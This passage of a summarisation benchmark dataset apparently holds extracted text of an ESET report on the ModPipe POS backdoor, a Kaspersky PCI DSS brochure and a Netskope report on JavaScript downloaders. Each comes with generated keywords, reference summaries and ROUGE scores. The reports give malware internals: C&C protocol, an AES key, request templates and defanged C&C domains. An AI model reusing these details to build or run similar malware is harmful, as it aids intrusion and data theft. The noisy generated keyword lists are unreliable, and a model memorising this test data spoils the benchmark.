confirm that the GetMicInfo module can successfully obtain the database passwords from RES 3700 POS v4.7 and v5.4. For all the other versions, we were able neither to confirm nor deny the ability of the component to obtain the targeted libraries.Downloadable module: ModScan 2.20The main purpose of ModScan 2.20 is to collect additional information about the installed MICROS POS environment on the machines by scanning selected IP addresses. The ModScan 2.20 module is injected into one of the processes specified by the C&C via an InstallMod command (0x72). Based on our findings, it is typically associated with one of the following legitimate processes:MDSHTTPService.exe (MICROS MDS HTTP Service) CALSrv.exe (MICROS CAL Service \u2013 Client Application Loader server) services.exeDifferences between the injected processes misused by GetMicInfo and those targeted by ModScan 2.20 might be caused by the fact that GetMicInfo module is injected only into processes running under WOW64.The list of IP addresses intended for scanning and the special \u201cping\u201d IP address are specified by the C&C in one of two ways. It is either:1. downloaded from the C&C along with the ModScan module, or 2. received during runtime, using the named pipe associated with the ModScan module.The ModScan module handles pipe commands listed in Table 2.Table 2. ModScan 2.20 module pipe commandsCommand nameCommand descriptionurl for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityCommand nameCommand descriptionexitstopscanprmExitTerminate scanning threadsStart scanning IPs specified in the command data to collect additional in- formation about the environmentSpecify special \u201cping\u201d IP addressScanning procedure routine1. Before scanning, the module sends a special \u201cping\u201d message containing a 32-bit valuegenerated by the GetTickCount Windows API function to TCP ports 50123 (used by MDS HTTP Service) and 2638 (used by SAP Sybase database server) of the \u201cping\u201d IP address.2. The response from the \u201cping\u201d IP address should contain the same 32-bit value rotatedright by one bit and XORed with the value 0x6CF6B8A8. If the response on at least one of the ports provides the appropriate value, the module will start the scan of the selected IP addresses. A decompilation of this ping function is shown in Figure 4.Figure 4. Hex-Rays decompiled code of the ModScan ping functionality3. When the ModScan module starts the scan, some of the following information may begathered, depending on the parameters received along with the scan command:Version of the Oracle MICROS RES 3700 POS, which is acquired by sending an HTTP Post message (see Figure 5) to the specified IP address on port 50123 used by the MDS HTTP Service. The sought-after information is stored between data xml tags (<data>%version%</data>) of the response from the service.url for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurity1234567891011121314151617181920POST /%s HTTP/1.1Accept: text/xmlUser-Agent: MDS POS ClientHost: %s:50123Content-Length: 459Connection: Keep-AliveCache-Control: no-cache<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"url lope/\"><SOAP-ENV:Body xmlns:MCRS-ENV=\"MCRS-URI\"><MCRS-ENV:Service>MDSSYSUTILS</MCRS-ENV:Service><MCRS-ENV:Method>Reg_GetValue</MCRS-ENV:Method><MCRS-ENV:SessionKey>Session</MCRS-ENV:SessionKey><MCRS-ENV:InputParameters><Key>SOFTWARE\\MICROS</Key><KeyType>HKEY_LOCAL_MACHINE</KeyType><KeyName>Version</KeyName></MCRS-ENV:InputParameters></SOAP-ENV:Body></SOAP-ENV:Envelope>Figure 5. MDS HTTP Service requestName of the database, extracted by sending a specially crafted TCP packet (possibly using the CMDSEQ command protocol) to the selected IP address on port 2638 used by the SAP Sybase Database Server. The string representing the name of the database is located at offset 0x28 of the response sent by the database server.url for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityDatabase server data, such as its name, version of the TDS protocol and the TDS server version. To gain this information, the ModScan module sends a hardcoded TDS 4.2 & 5.0 Login Packet (Figure 6) to the specified IP address on port 2638. The response includes a Login Acknowledgement packet which, in both cases \u2013 success and failure \u2013 contains information about the database server and the TDS versions used. The TDS login packet is hardcoded, with username set to the built-in dba and a hardcoded password, which is potentially the default password in some RES 3700 POS versions. As we haven\u2019t found any public reference to this password, we won\u2019t be publishing it in our blogpost.Figure 6. TDS 4.2 & 5.0 Login Packet used by the ModScanmodule, dissected using WiresharkDownloadable module: ProcListThe last of the downloadable modules we were able to obtain and dissect was ProcList. This is a lightweight module that doesn\u2019t have an assigned ID. Its main purpose is to collect information about currently running processes, including: name, process identifier (PID), parent process PID, number of threads, token owner, token domain, process creation time, and command line.url for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityOptionally, ProcList can also collect information about loaded modules for each of the running processes. Collected information is sent to the main module of the backdoor (using pipe message 0x10000013).Initial dropperThe initial dropper is responsible for installing the next stage of the malware. During our investigation, we discovered one dropper executable on two compromised machines, stored in the following locations:C:\\IQXDatabase\\Live\\1.exe C:\\OasisLive\\1.exeEach time the initial dropper is executed, a unique configuration is generated, using mostly random bytes. This causes the hash of the dropped loader to change with each execution, complicating detection and tracking of the malware. The dropper component can drop the loader into two possible locations and set up the persistence mechanism by creating a Windows service or Windows registry Run key (for details, please refer to the Indicators of Compromise section).The encrypted payload, containing the main functionality of the dropper, is stored in the dropper\u2019s resources as bitmaps named from A to L. The dropper decrypts this payload using the provided command line parameter, then executes it. The payload is responsible for decrypting the appropriate loader depending on the system architecture, so either 32-bit or 64-bit. Each of the loaders is encrypted using its own XOR key, each 0x80 bytes long. Decompiled code responsible for loading the payload from the binary\u2019s resources, its decryption and execution is shown in Figure 7.url for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityFigure 7. Hex-Rays decompiled code \u2013 decryption and execution of the payload in the initial dropperurl for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityAn example of an encrypted and decrypted configuration with explanations is visible in Figure 8. The configuration shown comes from the loader installed by the dropper sample the configuration can vary between older and newer versions of the loader executable.Figure 8. Example of the loader\u2019s generated configuration (upper is encrypted, lower decrypted)Persistent loaderThis component is responsible for both unpacking the main module and for its injection into one of the following processes:lsass.exe wininit.exe services.exeTo unpack the main module, the persistent loader uses different approaches for the 32-bit and 64-bit versions. While the 32-bit loader is almost identical to the initial dropper \u2013 the only difference being the payloads stored in the resources \u2013 the 64-bit loader uses completely different \u201cunpacking\u201d code.We have found seven different versions of the loader executables, each having a different compilation timestamp, with the oldest one probably originating in December 2017 and the latest in June 2020. For the full timeline, see Figure 9. A list of all the loader hashes is included in the Indicators of Compromise section.url for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityFigure 9. Timeline of known ModPipe variants and their timestamps.Main moduleThe main module is mostly responsible for managing C&C communication and for handling received messages/commands, either from C&C or downloadable modules. To facilitate the communication with modules, the main module starts by creating a pipe with a randomly generated name formatted using the following format string:{%08X-%04X-%04X-%04X-%08X%04X}It then periodically checks the pipe for new messages using the PeekNamedPipe Windows API function. Messages are parsed and handled according to their content. For a full list of recognized pipe commands and messages see Table 3.Table 3. List of pipe message/command typesMessage codeDescription0x10000012 inject and execute received module in specified process0x10000013 data for C&C server (execution logs, stolen data, \u2026)0x10000014 write requested configuration data to the file handle received in this mes-sage (most likely handle to named pipe created by some other module) (main config, network config, loader name, main module PID, )0x10000020 C&C commands (not encrypted) \u2013 see Table 4 for the full list of availablecommands0x10000022 set module status (or err code)0x10000023 set C&C communication time intervals0x10000024 close received list of handles0x10000025 get handle of the process with specified PID, duplicate it for some other specified process and send it through the received named pipe handle0x10000072 C&C commands (encrypted) \u2013 see Table 4 for the full list of availablecommandsurl for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityFor the detailed structure and format used for the messages transferred through the pipe refer to Figure 10.Figure 10. Structure of the main module\u2019s named pipe messagesFor communication with its C&C server, the main module uses HTTP and port 80. Each of the dissected samples contained a list of potentially available servers from which one was randomly chosen. A list of all C&C addresses discovered over the course of our research is available in the Indicators of Compromise section.Messages sent to the C&C (see Figure 11) are constructed and encrypted within the main module\u2019s code.url for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityFigure 11. Structure of the messages sent to the C&CBefore any communication with the C&C, the main module generates two clean URLs and uses them to check for an internet connection and a clean-looking cover for the malicious traffic. The URLs use the following format www.%domain%[.]com/?%rand%, where %domain% is randomly chosen from google, bing and yahoo and %rand% is a random 32- bit unsigned integer represented in ASCII.Communication with the C&C is encrypted using AES in CBC mode with the following 128- bit key: F45D076FEC641691A21F0C946EDA9BD5. Before encryption, C&C messages start with a 4-byte checksum, which is calculated as CRC32 (message) XORed with the first 4 bytes of the AES key used to encrypt the message. In the case of the key mentioned above, this would be F4 5D 07 6F.The data is transmitted using the lightweight networking module, which is injected on demand and exits immediately after uploading or downloading the requested message. To select the process for injection, the main module enumerates running processes and assigns them a priority value between 3 and 6. Those with higher priority are injected first, based on the following criteria:Priority 6Priority 5Priority 4The highest priority, assigned to any process that has already been used successfully to inject a networking module, received a response from the C&C and that is still running under the same PID, name and CreationTime.Process name with no extension that matches one of the following process names used for browsers: iexplore, opera, chrome, firefoxProcess name with no extension that matches the following process names: explorer, svchosturl for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityPriority 3All the other running processes excluding the following system processes: system, lsass, csrss, lsm, winlogon, smss, wininitThe main reason behind the priority list is to inject processes that are expected to communicate over the network and at the same time avoid system processes that might attract attention if caught communicating over the network.Networking moduleThis ModPipe module is responsible for sending requests to C&C and parsing payload received in the C&C responses. HTTP POST or GET methods with headers shown in Figure 12 and Figure 13 can be used to upload data to C&C and download additional payloads and C&C commands.123456789POST /robots.txt HTTP/1.1Accept: */*Content-Length: %data_length%Content-Type: application/octet-streamUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: %remote_host%Cache-Control: no-cache%data%Figure 12. HTTP POST header used to contact C&C12345GET %rsrc_path% HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)Host: %remote_host%Cache-Control: no-cacheFigure 13. HTTP GET message headerurl for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityResponses from the C&C server have to be at least 33-bytes long in order to be parsed by the networking module and the malicious payload is located after a sequence of 13 spaces followed by an HTML comment opening tag. An example of a server response including this sequence is shown in Figure 14.Figure 14. Example C&C server response including encrypted payloadIf all conditions are met, the network module sends the C&C response to the main module using a pipe message with ID 0x10000072. The main module then decrypts the payload, verifies its checksum and executes the C&C command. Available commands are listed in Table 4.Table 4. List of available main module commandsCom- mand code0x010x050x0A0x0B0x0C0x0D0x0ECommand descriptionExitUpdate list of C&C addressesInject and execute received module in specified processInject and execute received module in specified process (module name is in- cluded in the command)Optionally write module to the encrypted storage, then inject and execute re- ceived module in specified process \u2013 add it to the list of the installed modulesSend command to the named pipe belonging to the module with specified ID and queue the response for the upload to the C&CUninstall module with specified ID (remove from the in-memory list and en- crypted storage)url for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityCom- mand code0x0FCommand descriptionSave network configuration to the encrypted storageConclusionModPipe shows quite a few interesting features. Probably the most intriguing finding is the algorithm hidden in one of the backdoor\u2019s modules, which was specifically designed to steal credentials by decrypting them from registry values. By acquiring the database passwords, the attackers gain broad access to sensitive information even though the most sensitive data stored in devices running RES 3700 POS should still be protected by encryption.ModPipe\u2019s architecture, modules and their capabilities also indicate that its writers have extensive knowledge of the targeted RES 3700 POS software. The proficiency of the operators could stem from multiple scenarios, including stealing and reverse engineering the proprietary software product, misusing its leaked parts or buying code from an underground market.To keep the operators behind ModPipe at bay, potential victims in the hospitality sector as well as any other businesses using the RES 3700 POS are advised to:Use the latest version of the software. Use it on devices that run updated operating system and software. Use reliable multi-layered security software that can detect ModPipe and similar threats.Indicators of CompromiseC&C IP addresses191.101.31[.]223 194.32.76[.]192 23.19.58[.]114 88.99.177[.]103 91.209.77[.]172 5.135.230[.]136C&C domains/URLssubzeroday.zapto[.]org shj145ertyb.ddns[.]net/gettime.htmlurl for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityouidji12345.ddns[.]net/gettime.htmlDropper samples9F8530627A8AD38F47102F626DEC9F0173B44CD5 0F4355A17AABD3645788341EAC2A9BB759DB95EEFile paths%CSIDL_APPDATA%\\Microsoft\\Windows\\{%rand_guid%}\\explorer.exe %WINDIR%\\system32\\%random_name%.exe%rand_guid% \u2013 pseudo-random GUID formatted string %random_name% \u2013 from 4 to 7 pseudo-random letters (a-z) with the first one capital e.g. \u201cCvoeqo.exe\u201dMITRE ATT&CK techniquesNote: This table was built using version 7 of the MITRE ATT&CK framework.Tactic IDNameDescriptionExe- tenceT1059.003 Command and Command ShellT1547.001 Boot or Logon Au- tostart Execution: Registry Run Keys / Startup FolderT1543.003 Create or Modify System Process: Windows ServiceAttackers were seen using Windows Com- mand Shell to execute the initial dropper.ModPipe can use Registry Run key for persistence.ModPipe can create a new service for persistence.url for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityTactic IDNameDescriptionPrivi- trationT1134.001 Access Token Ma- nipulation: Token Impersonation/TheftAttackers were seen using partially modified PrintSpoofer tool to drop and subsequently execute loader with SYSTEM privileges.T1055.002 Process Injection:Portable Exe- cutable InjectionT1205Traffic SignalingT1552.002 Unsecured Creden- tials: Credentials in RegistryModPipe can inject it\u2019s modules into various processes.ModPipe\u2019s ModScan module sends random 32-bit values to TCP ports 50123 and 2638 of the specified IP address and requires a specific response in order to continue exe- cuting its scan functionality.ModPipe\u2019s GetMicInfo module retrieves en- crypted database passwords for ORACLE MICROS RES 3700 POS software from Win- dows Registry and uses a custom algorithm to decrypt them before uploading to the C&C.T1057Process Discovery ModPipe\u2019s ProcList module can get informa-tion about processes running on a system.T1012Query RegistryModPipe\u2019s GetMicInfo module queries the Registry for ORACLE MICROS RES 3700 POS version, database passwords and other configuration data.T1033System Owner/User DiscoveryModPipe gathers username and computer name from victim machines and reports them to the C&C in initial message.T1071.001 Application LayerProtocol: Web ProtocolsT1573.001 Encrypted Channel:Symmetric CryptographyModPipe uses HTTP for command and control.ModPipe encrypts communication with C&C using AES in CBC mode.T1041T1029Exfiltration Over C2 ChannelModPipe exfiltrates data over its C&C channel.Scheduled Transfer Default interval used by ModPipe for upload-ing data to C&C is set to 30 minutes.url for data, ModPipe backdoor hits POS software used in hospitality sector | WeLiveSecurityMartin Smol\u00e1r 12 Nov 2020 - 11:30AMNewsletterDiscussionurl ", "generated_text": "MODPipe; RES; POS software; ORACLE MICROS; RES; 3700 POS; the operators; sensitive information; computers; DOWNLOAD; GetMicInfo; access; data; the initial dropper; the persistent loader; the next stage; the main module; communications; a pipe; communication; Network; communications; communications; IP addresses; the registry; the modules; a dispatcher; communications; the C&C server; the system; the backdoor; control; data; the user; system info; customer data; certificates; the malware; its capabilities; customers.", "ref_text": "<START-1>The PDF describes a backdoor malware called ModPipe that targets point-of-sale (POS) software used in the hospitality industry. ModPipe was discovered by researchers at ESET who have been tracking it since late 2019. ModPipe uses a modular architecture, with an initial dropper, a persistent loader, a main module, networking modules, and downloadable modules that add specific functionality. One module called GetMicInfo contains an algorithm designed to decrypt database passwords stored encrypted in the Windows registry, showing the malware authors have extensive knowledge of the targeted POS software. While the most sensitive payment data should be protected by encryption, the decrypted credentials allow access to other sensitive information like transaction data, system configurations, and customer names. The full motives behind the operation are unclear. ModPipe uses HTTP for command and control communication, encrypting messages with AES. It can inject modules into running processes like explorer.exe for stealth. Infected systems were primarily found in the restaurant and hospitality industry in the United States. To defend against ModPipe, the PDF advises keeping POS software updated, running updated operating systems, and using reliable security software to detect the malware. Indicators of compromise like IP addresses, file hashes, and MITRE ATT&CK techniques are provided. <END-1>", "t5/keyword/hint_hit_precision": 0.3, "t5/word/hint_hit_recall": 0.08040201005025126, "gpt3/lexical/rouge_rouge1": 0.4848484848484849, "gpt3/lexical/rouge_rouge2": 0.13414634146341464, "gpt3/lexical/rouge_rougeL": 0.24242424242424246, "gpt3/lexical/rouge_rougeLsum": 0.24242424242424246, "gpt3_generated_text": ["The article discusses the discovery of ModPipe, a modular backdoor targeting ORACLE MICROS Restaurant Enterprise Series (RES) 3700 POS software used in the hospitality sector. The backdoor allows operators to access sensitive information stored in devices running this software, including database passwords decrypted from Windows registry values. The backdoor's architecture includes components like the initial dropper, persistent loader, main module, networking module, and downloadable modules with specific functionality. It is noted that while the backdoor can access database contents, it may not be able to retrieve sensitive data like credit card numbers and expiration dates, which are encrypted. The operators may have to reverse engineer the encryption process to access this data. The distribution method of ModPipe and the full extent of its capabilities remain unclear."]}, {"split_name": "val", "sample_id": "val_125", "prompt_text": "Extract the keywords: PCI DSS v3.2 MappingPCI DSS 3.2 regulates many technical security requirements and settings for systems operating with credit card data. Sub-points 1.4, 2.4a, 5.1, 5.1.1, 5.2, 5.3, 6.2, 10.5.5, 11.5 of PCI DSS v3.2 provide for the strict regulation of protection relating to any endpoint which is operating with cardholder data. It is common practice, although not an official rule, for Device Control + Application Control functions to also be considered to be within the remit of the PCI DSS antivirus software audit. More regulations covered by a single product makes compliance easier to achieve.Kaspersky Embedded Systems Security covers a wide range of requirements:1.4Install personal firewall software or equivalent functionality on any portable computing devices that connect to the Internet when outside the network, and which are also used to access the CDE. Firewall (or equivalent) configurations include: \u2022 Specific configuration settings are defined. \u2022 Personal firewall (or equivalent functionality) is actively running. \u2022 Personal firewall (or equivalent functionality) is not alterable by users of the portablecomputing devices.2.4.aExamine system inventory to verify that a list of hardware and software components is maintained and includes a description of function/use for each.5.1Deploy antivirus software on all systems commonly affected by malicious software (particularly personal computers and servers).5.1.1Ensure that antivirus programs are capable of detecting, removing, and protecting and generate audit logs which are retained per PCI DSS Requirement 10.7Ensure that antivirus mechanisms are actively running and cannot be disabled or altered by users, unless specifically authorized by management on a case-by-case basis for a limited time period.Ensure that all system components and software are protected from known vulnerabilities by installing applicable vendor-supplied security patches. Install critical security patches within one month of release.*10.5.5Use file-integrity monitoring or change-detection software on logs to ensure that existing log data cannot be changed without generating alerts (although new data being added should not cause an alert).11.5Deploy a change-detection mechanism (for example, file-integrity monitoring tools) to alert personnel to unauthorized modification (including changes, additions and deletions) of critical system files, configuration files, or content files; and configure the software to perform critical file comparisons at least weekly.* Additional license required.Cyber Threats News: www.securelist.com IT Security News: business.kaspersky.com IT Security for SMB: kaspersky.com/business IT Security for Enterprise: kaspersky.com/enterprisewww.kaspersky.com2019 AO Kaspersky Lab. All rights reserved. Registered trademarks and service marks are the property of their respective owners.We are proven. We are independent. We are transparent. We are committed to building a safer world, where technology improves our lives. Which is why we secure it, so everyone everywhere has the endless opportunities it brings. Bring on cybersecurity for a safer tommorow.Know more at kaspersky.com/transparency ", "generated_text": "Kaspersky; PCI DSS v3.2; protection; systems; credit card data; sub-points; 1.4; 2.4a; 5.1; 5.2; 5.1.1; 5.3; 6.2; 105.5; 5.1; Personal firewall software; all systems; malicious software; devices; the CDE; vulnerability; 5.1; Personal firewall software; all systems; malicious software; functionalities; 2.4; a list; hardware; software components; initial access; 2.4; a list; security patches; critical security patches; critical system data; a change-detection mechanism; alerts; critical system files; changes; the software; a month; additional license; encryption; the certificate; the certificate; a system; the risk; protection; security.", "ref_text": "<START-1>The document outlines how Kaspersky Embedded Systems Security aligns with PCI DSS v3.2 requirements for security controls on systems handling credit card data. It lists specific PCI DSS requirements covered by Kaspersky Embedded Systems Security features including: - Personal firewall for portable devices (1.4) - Maintaining system inventory (2.4a) - Antivirus deployment and updates (5.1, 5.2) - Preventing antivirus disablement (5.3) - Installing vendor patches (6.2) - File integrity monitoring (10.5.5, 11.5) Additional controls like application control and device control are also noted as commonly expected for PCI DSS compliance. Having a single product cover multiple PCI DSS requirements is highlighted as making compliance easier to achieve. Overall, the document aims to position Kaspersky Embedded Systems Security as helping to secure systems and comply with PCI DSS endpoint security standards. <END-1>", "t5/keyword/hint_hit_precision": 0.24, "t5/word/hint_hit_recall": 0.12307692307692308, "gpt3/lexical/rouge_rouge1": 0.5692883895131085, "gpt3/lexical/rouge_rouge2": 0.21886792452830192, "gpt3/lexical/rouge_rougeL": 0.32209737827715357, "gpt3/lexical/rouge_rougeLsum": 0.32209737827715357, "gpt3_generated_text": ["The article discusses the importance of complying with PCI DSS v3.2 regulations to protect systems operating with credit card data. It highlights specific sub-points such as 1.4, 2.4a, 5.1, 5.1.1, 5.2, 5.3, 6.2, 10.5.5, and 11.5 that focus on endpoint protection and antivirus software requirements. Kaspersky Embedded Systems Security is recommended as a comprehensive solution that covers a wide range of security requirements, including deploying antivirus software, maintaining system inventory, installing security patches, and using change-detection mechanisms to prevent unauthorized modifications. By incorporating Device Control + Application Control functions, compliance with PCI DSS becomes easier to achieve. The article emphasizes the importance of cybersecurity and the commitment of Kaspersky to building a safer world through transparent and independent security solutions."]}, {"split_name": "val", "sample_id": "val_126", "prompt_text": "Extract the keywords: Targeted Attack Campaigns with Multi-Variate Malware Observed in the Cloudnetskope.com/blog/targeted-attack-campaigns-multi-variate-malware-observed-cloudAbhinav SinghMarch 8, 2017This website uses cookies We use cookies to personalise content and ads, to provide social media features and to analyse traf\ufb01c. We also share information about your use of our site with our social media, advertising and analytics partners who may combine it with other information that you\u2019ve provided to them or that they\u2019ve collected from your use of their services. To opt-in, select ok, otherwise select settings to set opt-out preferences.OK Show detailsThis website uses cookies for advertising and analytics purposes as described in our cookie policy. For more information and to set preferences, please click here. By continuing to browse this website, you accept our use of cookies.\u00d7url Attack Campaigns with Multi-Variate Malware Observed in the Cloud - NetskopeNetskope Threat Research Labs has observed ongoing targeted attacks in enterprise cloud environments that lead to a malware fan-out effect through automated syncing and sharing of \ufb01les in the cloud. While monitoring this attack, we captured several instances where the synced \ufb01lenames were similar to the email addresses of the attack victims. These attachments are often automatically synced to cloud storage applications using \ufb01le collaboration settings in popular SaaS applications like Of\ufb01ce365, Google mail etc. This auto-syncing feature can also be achieved through third party applications as well. Since the \ufb01lenames appear less suspicious, they are more likely to be viewed as coming from within the organization (and therefore trusted) and shared with others in the same user group.Figure 1 illustrates this effect in a cloud environment and how Netskope detects the attack patterns at various stages.Figure 1: Infection propagation in the Cloudurl Attack Campaigns with Multi-Variate Malware Observed in the Cloud - NetskopeThe synced \ufb01les were all zipped and contained obfuscated JavaScript. Over the course of this campaign, Netskope Threat Protection detected variations in both zipped JavaScript as well as the \ufb01nal payload that would be delivered once the JavaScript was executed. Changes in JavaScript were limited to varying obfuscation techniques, but there were three variations in \ufb01nal payload over the course of time. The payload\u2019s variations were associated with keyloggers, remote access trojans, and more importantly, ransomware. Some of these samples would disable endpoint antivirus software, leaving the enterprise to rely on a remote scan engine like Netskope Threat Protection.Consider the example recipient as joey.tribbiani@example.com, we noticed following variations in attachment names for the targeted emails:Joey.tribbiani[0-9A-Z]{6,8}_[0-9A-F]{6,8}.zipJoey.trbbiani_proposal_[0-9A-F]{6}.zipPdf_letter-joey.tribbiani_[0-9A-F]{6}.zip Attack Vector The attack vector follows the usual infection pattern in which the attached zip \ufb01le contains an obfuscated JavaScript. We have noticed variations in the wrapper JavaScript indicating that the attackers were attempting multiple ways to circumvent the corporate environment. Netskope Threat Protection detects the attached zip \ufb01le and obfuscated JavaScript inside as Gen.Downloadrs.B1F4C42E,Gen.Downloadrs.10CC4FE0 and Generic.JS.DownloaderS.B1F4C42E respectively. Obfuscated JavaScripts During our investigation, we observed two variations of the obfuscated JavaScript that were delivered as zip attachments to the recipients. First Variation is shown in Figure 2.url Attack Campaigns with Multi-Variate Malware Observed in the Cloud - NetskopeFigure 2 : Simpli\ufb01ed version of the obfuscated wrapper JavaScript.The above JavaScript creates a Windows script host object to establish connection with the hard- coded url (astralopitec[.]yomu[.]ru) in object named \u201cdingy\u201d. The fetched malware payload is then stored in the %TEMP% directory. Second Variation with domains hosting the payloads. The box in \ufb01gure 3 shows the fully constructed domain names once the script is completely deobfuscated.The dropped payload is again saved with a random name in the %TEMP% directory. Payload Variations We noticed three different variations in the payloads delivered using the obfuscated JavaScript. These payloads belong to Adwind RAT, iSpy keylogger and Locky ransomware families detected by Netskope Threat protection as Backdoor.Generckd.3312003, Gen:Variant.Rzy.73941 and Backdoor.Agnt.CDQB. Payload Variation 1 : Adwind RAT Netskope detection: Backdoor.Generckd.3312003The \ufb01rst payload that we encountered while tracking this campaign was an instance of cross- platform, Java based Adwind RAT, which has the capability to infect Windows, Linux and Macs as shown in Figure 4.url Attack Campaigns with Multi-Variate Malware Observed in the Cloud - NetskopeFigure 4: Excerpt of decompiled Jar of Adwind RATThe RAT has the capability to launch a shell connectivity giving backdoor access to the attacker and has basic \ufb01le stealing features. Figure 5 below shows the class \ufb01les which form the crux of the RATs capabilities.url Attack Campaigns with Multi-Variate Malware Observed in the Cloud - NetskopeFigure 5: Adwind RAT capabilities de\ufb01ned in the decompiled codeUpon execution on a typical windows environment, the RAT will create a random user pro\ufb01le and will attempt to create persistence by registering an entry into HKCU Run key:\u201creg.exe\u201d (Access type: \u201cSETVAL\u201d; Path: \u201cHKCU\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN\u201d; Key: \u201cHP\u201d; Value: \u201c\u201d%APPDATA%\\Oracle\\bin\\javaw.exe\u201d -jar \u201c%USERPROFILE%\\QI\\giwauQII.cvLwffAX\u201d\u201d)The jar \ufb01le constructs multiple VB scripts onto the disk, which are executed by launching an instance of command prompt. These visual basic scripts creates WMI command line queries and checks for system information like anti-virus programs, \ufb01rewall settings etc. A snapshot of the scripts is shown in \ufb01gure 6. Adwind also copies relevant Java Runtime \ufb01les to Appdata using xcopy command.Figure 6: VB scripts created by the RAT to gather system informationThe sample tried connecting to a dynamic dns domain, securitypoint[.]ddns[.]net. Hosting C&C servers on dynamic DNS services helps attackers in quickly switching their IPs without changing the host. Payload Variation 2 : iSpy Keylogger Netskope detection: Gen:Variant.Rzy.73941The next instance of malware was observed to be the popular iSpy keylogger, which is sold in a subscription based model in underground forums. iSpy is a .Net compiled keylogger that comes packed with loads of additional features like stealing browser history, webcam logging, keystroke recording, clipboard monitoring etc. Figure 7 shows the captured strings in memory when the keylogger is installed onto the system.url Attack Campaigns with Multi-Variate Malware Observed in the Cloud - Netskopeurl Attack Campaigns with Multi-Variate Malware Observed in the Cloud - NetskopeFigure 7: iSpy keylogger activities captured in memory stringsUpon execution, the malware creates a copy of itself in \\App Data\\Roaming\\Microsoft\\Windows\\ScreenToGif.The malware maintains persistence by creating registry entries in HKU\\.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\Cache. The entry is made to invoke a payload activator executable that checks for running instances of the main iSpy payload based on the mutex. If the malware is not already loaded in the memory, It will launch its new instance. The payload loader is stored in the %TEMP% directory. Parts of the decompiled code can be seen in Figure 8.Figure 8: Payload loader\u2019s decompiled codeThe code will look for running instance of process named \u201cnetprotocol\u201d and sleeps if it is already loaded into the memory. It will spun up a new process by invoking the copy of malware stored in the ScreenToGif folder.Apart from the keylogging and information stealing features, iSpy also makes sure that it disables any known running instances of a wide variety of anti-virus programs onto the system as shown in Figure 9.Figure 9: Process names of anti-virus solutions targeted by iSpy keyloggerThe bene\ufb01t of using a cloud security solution like Netskope is that they are not affected by such counter-measures implemented by sophisticated malware.url Attack Campaigns with Multi-Variate Malware Observed in the Cloud - NetskopeThe malware stores the ex\ufb01ltrated data in a \ufb01le in the %TEMP% directory and sends the harvested data to the C&C, westech-solar[.]co. At the time of analysis, the C&C was unresponsive. Payload Variation 3: Variant of Locky/Zepto Sample hash: 6968F0AF128C27C6C970ADC0B301D204 Netskope detection: Backdoor.Agnt.CDQBThe third and last payload noticed during our monitoring, belongs to Locky ransomware family. We observed a variant of Locky being delivered as the \ufb01nal payload once the user executes the attached JavaScript. We have blogged about a detailed analysis of the variant Zepto here. The samples noticed during this campaign were no different from the one we disclosed in our blog. There were slight variations in the \ufb01rst level JavaScript where the payload execution parameters were slightly obfuscated.Figure 10: Ransom message from Locky/Zepto Conclusion Sending malicious attachments through emails is not new, but remains a very popular method for delivering targeted attacks. By crafting an attack vector that leaves little for many existing enterprise security solutions, it becomes easy for attackers to infect users and network. Organizations using cloud storage apps further amplify the attack vector when the malicious \ufb01les and payloads is synced across multiple users. General recommendations Netskope recommends following course of actions to effectively counter such threats:Detect and remediate all threats at rest in sanctioned cloud services using a threat-aware Cloud Access Security Broker like Netskope. Detect and remediate all threats being downloaded from unsanctioned cloud services using a threat-aware solution like Netskope.url Attack Campaigns with Multi-Variate Malware Observed in the Cloud - NetskopeScan \ufb01les using remote scanning services like Netskope Advanced Threat Protection, that cannot be disabled by malware. Regularly back up and turn on versioning for critical content in cloud services. Avoid opening email attachments if it appears to be coming from unknown sources. Disable automatic unzipping of \ufb01les and avoid clicking on any JavaScript that comes as zipped archive unless fully veri\ufb01ed by the sender or IT administrator. Actively track usage of unsanctioned cloud services and enforce DLP policies to control \ufb01les and data entering and leaving your corporate environment. Keep systems and antivirus updated with the latest releases and patches.Contact Us We'd love to hear from you!url ", "generated_text": "Targeted Attack Campaigns; enterprise cloud environments; the malware; email addresses; the email addresses; the attackers; files; The malware; variations; the JavaScript; domains; the attackers; the cloud; solutions; SysAdmin; email; server; RDP; Remote Access Trojan; ransomware; the cloud; infrastructure; a remote scan engine; detections; the system; process; the infrastructure; domains; analysis; the behavior; the malware; similarities; the emails; the emails; the cloud.", "ref_text": "<START-1>The PDF discusses targeted cyberattack campaigns that Netskope Threat Research Labs observed in enterprise cloud environments. The attacks involved sending emails with zipped JavaScript attachments that would sync and share themselves via cloud storage apps. File names resembled recipients' email addresses to appear more legitimate when shared. The JavaScript attachments contained varying obfuscation techniques but ultimately dropped a remote access trojan, keylogger, or ransomware payload on the victim's system. Payloads included Adwind RAT, iSpy keylogger, and Locky ransomware variants. The automated file sharing spread the infection rapidly in the cloud. Netskope detected the attacks at multiple stages, including the initial zipped JavaScript attachment, obfuscated code, and final payload. The JavaScript exploited Windows Script Host to download the malicious payload and used domain generation algorithms to avoid blocking. Payloads employed anti-virus evasion and remote scanning resistance. To counter such threats, Netskope recommends detecting and remediating malware in sanctioned cloud apps, blocking unsanctioned cloud access, using remote file scanning, backing up critical data, avoiding suspicious attachments, tracking risky cloud usage, updating systems/AV, and enforcing data policies. The layered defense highlights the importance of cloud-based security to cover the entire attack chain. <END-1>", "t5/keyword/hint_hit_precision": 0.17142857142857143, "t5/word/hint_hit_recall": 